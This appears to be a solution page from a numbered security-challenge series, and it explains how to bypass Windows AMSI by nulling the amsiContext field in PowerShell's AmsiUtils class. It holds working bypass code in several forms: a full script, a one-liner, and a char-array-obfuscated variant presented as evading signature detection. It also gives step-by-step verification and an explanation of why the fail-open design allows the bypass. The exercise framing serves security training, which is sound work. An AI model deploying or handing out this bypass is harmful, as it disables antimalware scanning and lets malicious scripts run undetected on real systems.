---
title: "Solution 38: AMSI Context Corruption (Null Context)"
challenge_number: 38
difficulty: medium
category: "AMSI Bypass"
permalink: /solutions/38-context-corruption/
---

# Solution: AMSI Context Corruption (Null Context)

[Back to Challenge](../challenges/38-context-corruption.md)

## Overview

Null the `amsiContext` field in `AmsiUtils` by setting it to `IntPtr.Zero`. When `AmsiScanBuffer` receives an invalid context handle, it returns `E_INVALIDARG`. PowerShell interprets this error as "AMSI unavailable" and continues execution without blocking.

## Working Code

### Primary Method: Null the Context

```powershell
# Get the AmsiUtils type
$ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Get the private static amsiContext field (holds the HAMSICONTEXT handle)
$ctxField = $ctx.GetField('amsiContext','NonPublic,Static')

# Set it to IntPtr.Zero (null pointer)
$ctxField.SetValue($null, [IntPtr]::Zero)

Write-Host "AMSI context nulled - scans will return E_INVALIDARG"
```

### One-Liner

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
```

### Obfuscated Version (Evades Signature Detection)

```powershell
$t = [char[]](65,109,115,105,85,116,105,108,115) -join ''
$f = [char[]](97,109,115,105,67,111,110,116,101,120,116) -join ''

$type = [Ref].Assembly.GetType("System.Management.Automation.$t")
$field = $type.GetField($f, 'NonPublic,Static')
$field.SetValue($null, [IntPtr]::Zero)
```

### Verify Current Context Value

```powershell
$ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$ctxField = $ctx.GetField('amsiContext','NonPublic,Static')
$currentValue = $ctxField.GetValue($null)
Write-Host "Current amsiContext: $currentValue (0x$($currentValue.ToString('X')))"
# Before bypass: non-zero handle value
# After bypass: 0
```

## Why It Works

### The AMSI Scan Flow

When PowerShell scans content, the internal flow is:

```csharp
// Simplified AmsiUtils.ScanContent()
internal static AMSI_RESULT ScanContent(string content, string sourceMetadata)
{
    if (amsiInitFailed)
        return AMSI_RESULT_NOT_DETECTED;

    // Uses the stored context handle for the scan call
    int result = 0;
    HRESULT hr = AmsiScanBuffer(amsiContext, buffer, length, sourceMetadata, amsiSession, ref result);

    if (hr != S_OK)
        return AMSI_RESULT_NOT_DETECTED;  // ← Error = no detection

    return (AMSI_RESULT)result;
}
```

### What Happens with a Null Context

1. `amsiContext` holds an `IntPtr` that was returned by `AmsiInitialize()` during startup
2. When we set it to `IntPtr.Zero`, it becomes an invalid handle
3. The next call to `AmsiScanBuffer(IntPtr.Zero, ...)` fails parameter validation
4. `amsi.dll` returns `E_INVALIDARG` (0x80070057) — "One or more arguments are not valid"
5. PowerShell's error handling interprets any non-S_OK HRESULT as "scan unavailable"
6. It returns `AMSI_RESULT_NOT_DETECTED` and allows execution to continue

### Difference from amsiInitFailed (Challenge 31)

| Approach | Field Modified | Effect |
|----------|---------------|--------|
| Challenge 31 | `amsiInitFailed = true` | Skips the scan call entirely |
| Challenge 38 | `amsiContext = IntPtr.Zero` | Makes the scan call, but it fails gracefully |

Both achieve the same result — content is not blocked. However, they target different code paths:
- **amsiInitFailed**: Bypass at the "should I scan?" decision
- **amsiContext**: Bypass at the "can I scan?" execution

### The Design Flaw

PowerShell must handle AMSI failures gracefully because:
- AMSI providers can be absent (no AV installed)
- AMSI providers can crash
- The system must remain functional even if security components fail

This "fail-open" design means any corruption that causes an error in the scan path results in the content being allowed.

### Memory Layout

```
System.Management.Automation.AmsiUtils (static class)
├── amsiInitFailed   : bool     = false
├── amsiContext      : IntPtr   = 0x00007FF...  (valid handle from AmsiInitialize)
├── amsiSession      : IntPtr   = 0x00007FF...  (session handle)
└── [methods]
    ├── Init()               → calls AmsiInitialize, stores handle
    ├── ScanContent()        → calls AmsiScanBuffer with stored handle
    └── Uninitialize()       → calls AmsiUninitialize
```

After our modification:
```
├── amsiContext      : IntPtr   = 0x0000000000000000  (null - invalid)
```

## How to Verify

1. Open a fresh PowerShell session:
   ```powershell
   powershell.exe -NoProfile
   ```

2. Check the current context value:
   ```powershell
   $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
   $ctxField = $ctx.GetField('amsiContext','NonPublic,Static')
   Write-Host "Before: $($ctxField.GetValue($null))"
   # Output: Before: <non-zero handle value like 2094833270784>
   ```

3. Apply the bypass:
   ```powershell
   $ctxField.SetValue($null, [IntPtr]::Zero)
   ```

4. Verify the context is now null:
   ```powershell
   Write-Host "After: $($ctxField.GetValue($null))"
   # Output: After: 0
   ```

5. Test with content that would normally trigger AMSI:
   ```powershell
   Invoke-Expression 'Write-Host "malware test - AMSI context corrupted"'
   ```
   If it executes without being blocked, the bypass is working.

6. Confirm that amsiInitFailed is still False (proving this is a different bypass path):
   ```powershell
   $initField = $ctx.GetField('amsiInitFailed','NonPublic,Static')
   Write-Host "amsiInitFailed: $($initField.GetValue($null))"
   # Output: amsiInitFailed: False
   # (The bypass works through context corruption, not init failure)
   ```
